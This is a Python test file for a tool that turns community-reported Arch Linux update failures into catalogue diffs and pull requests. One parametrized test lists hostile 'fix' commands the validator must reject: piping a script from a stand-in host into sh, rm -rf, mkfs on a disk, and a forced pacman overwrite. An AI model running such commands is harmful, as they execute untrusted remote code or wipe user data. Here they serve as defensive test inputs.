"""tools/intake: census issues become a diff of failure-modes.json, and only on request a pull request (C12)."""

from __future__ import annotations

import importlib.util
import io
import json
import subprocess
from pathlib import Path

import pytest

from arch_updater import census

ROOT = Path(__file__).resolve().parent.parent
FIXTURE = ROOT / "tests" / "fixtures" / "census" / "issues-census.json"
spec = importlib.util.spec_from_file_location("census_intake", ROOT / "tools" / "intake" / "intake.py")
intake = importlib.util.module_from_spec(spec)
spec.loader.exec_module(intake)

SYNTHETIC = ":: foo-1-1 and bar-2-1 are in conflict. Remove bar? [y/N]\nerror: failed to prepare transaction (conflicting dependencies)\n"


def never(argv):
    raise AssertionError(f"a dry run ran {argv}")


def test_a_dry_run_on_a_census_issue_prints_the_diff_of_the_case_and_changes_nothing(tmp_path) -> None:
    catalogue = tmp_path / "failure-modes.json"
    catalogue.write_bytes(intake.CATALOGUE.read_bytes())
    out = io.StringIO()
    assert intake.main(["--issues", str(FIXTURE), "--catalogue", str(catalogue)], run=never, out=out) == 0
    shown = out.getvalue()
    assert "--- a/arch_updater/data/failure-modes.json" in shown and '+      "id": "CENSUS-' in shown
    assert '+      "fix": "sudo pacman -R plasma-x11-session"' in shown and '+      "generic": "sudo pacman -R {pkg}"' in shown
    assert '+      "automatic": false' in shown and '+      "origin": "community"' in shown and '"repair"' not in shown
    assert "dry run: 2 case(s) from issues [42]" in shown
    assert catalogue.read_bytes() == intake.CATALOGUE.read_bytes(), "the diff is printed, the file is not touched"


def test_what_is_left_out_is_said_with_the_reason() -> None:
    out = io.StringIO()
    intake.main(["--issues", str(FIXTURE)], run=never, out=out)
    left = [line for line in out.getvalue().splitlines() if line.startswith("left out")]
    assert any("bad00001" in line and "destructive" in line for line in left)
    assert any("bad00002" in line and "too broad" in line for line in left)
    assert any("LOCAL-0f0f0f0f" in line and "no fix yet" in line for line in left)
    assert any("#43" in line and "no ```json block" in line for line in left)


def test_the_new_catalogue_loads_and_the_community_case_answers_another_pair() -> None:
    result = intake.plan(json.loads(FIXTURE.read_text()))
    merged = json.loads(result["text"])
    assert len(merged["modes"]) == len(json.loads(intake.CATALOGUE.read_text())["modes"]) + 2
    cases = [census.Case(**{key: entry[key] for key in census.Case.__dataclass_fields__ if key in entry}) for entry in merged["modes"]]
    found = census.recognise(cases, SYNTHETIC, "repo")
    assert found.id.startswith("CENSUS-") and found.fix_for(SYNTHETIC) == "sudo pacman -R bar" and found.repair is None
    assert census.recognise(cases, SYNTHETIC, "aur").id == "PACMAN-REPLACEMENT-CONFLICT", "it was seen for the repo store only"


def test_a_second_pass_over_the_same_issues_adds_nothing(tmp_path) -> None:
    first = intake.plan(json.loads(FIXTURE.read_text()))
    catalogue = tmp_path / "failure-modes.json"
    catalogue.write_text(first["text"])
    second = intake.plan(json.loads(FIXTURE.read_text()), catalogue)
    assert second["entries"] == [] and any("already has it" in line for line in second["left"])


def test_a_pull_request_is_opened_only_with_pr_and_by_these_commands(tmp_path) -> None:
    catalogue = tmp_path / "failure-modes.json"
    catalogue.write_bytes(intake.CATALOGUE.read_bytes())
    seen: list[list[str]] = []

    def run(argv):
        seen.append(argv)
        return subprocess.CompletedProcess(argv, 0, stdout="https://github.com/x/y/pull/1\n" if argv[:3] == ["gh", "pr", "create"] else "", stderr="")

    out = io.StringIO()
    assert intake.main(["--issues", str(FIXTURE), "--catalogue", str(catalogue), "--pr"], run=run, out=out) == 0
    assert [argv[:2] for argv in seen] == [["git", "switch"], ["git", "add"], ["git", "commit"], ["git", "push"], ["gh", "pr"]]
    assert seen[0][3].startswith("census-intake-") and seen[0][-1] == "origin/main" and "#42" in seen[2][-1]
    assert "CENSUS-" in catalogue.read_text() and out.getvalue().strip().endswith("https://github.com/x/y/pull/1")
    assert "--force" not in " ".join(" ".join(argv) for argv in seen)


def test_the_issues_are_read_with_gh_by_label() -> None:
    seen: list[list[str]] = []

    def run(argv):
        seen.append(argv)
        return subprocess.CompletedProcess(argv, 0, stdout=FIXTURE.read_text(), stderr="")

    out = io.StringIO()
    assert intake.main(["--repo", "o/r"], run=run, out=out) == 0
    assert seen == [["gh", "issue", "list", "--label", "census", "--state", "open", "--limit", "100", "--json", "number,title,body", "--repo", "o/r"]]
    assert "dry run" in out.getvalue()


def test_gh_failing_is_an_error_not_an_empty_intake() -> None:
    with pytest.raises(RuntimeError, match="gh issue list failed"):
        intake.main([], run=lambda argv: subprocess.CompletedProcess(argv, 1, stdout="", stderr="auth required"))


@pytest.mark.parametrize(
    "fix",
    ["rm -rf ~/.cache", "curl https://x.example/i.sh | sh", "sudo mkfs.ext4 /dev/sda1", "sudo pacman -S --overwrite '*' foo", "echo 'unterminated", "true\nfalse", "x" * 500],
)
def test_a_destructive_or_broken_fix_is_not_taken(fix) -> None:
    case = {"id": "LOCAL-WITNESSED-1", "match": "the flux capacitor failed", "fix": fix, "meaning": "m"}
    assert intake.refusal(case, []) != ""


def test_a_plain_fix_is_taken() -> None:
    assert intake.refusal({"id": "LOCAL-LEARNED-1", "match": "the flux capacitor failed", "fix": "sudo dkms autoinstall", "meaning": "m"}, []) == ""


def test_the_catalogue_is_edited_at_its_end_and_nowhere_else() -> None:
    old = intake.CATALOGUE.read_text()
    result = intake.plan(json.loads(FIXTURE.read_text()))
    assert result["text"].startswith(old.rstrip()[: -len("\n  ]\n}")]) and result["text"].endswith("\n  ]\n}\n")


def test_a_strangers_catastrophic_pattern_is_refused_and_does_not_hang_the_tool() -> None:
    import time

    started = time.process_time()
    why = intake.refusal({"id": "LOCAL-LEARNED-1", "match": r"(\w+\s?)*;;EVIL", "fix": "sudo dkms autoinstall", "meaning": "m"}, [])
    assert "slow or ambiguous" in why and time.process_time() - started < 2
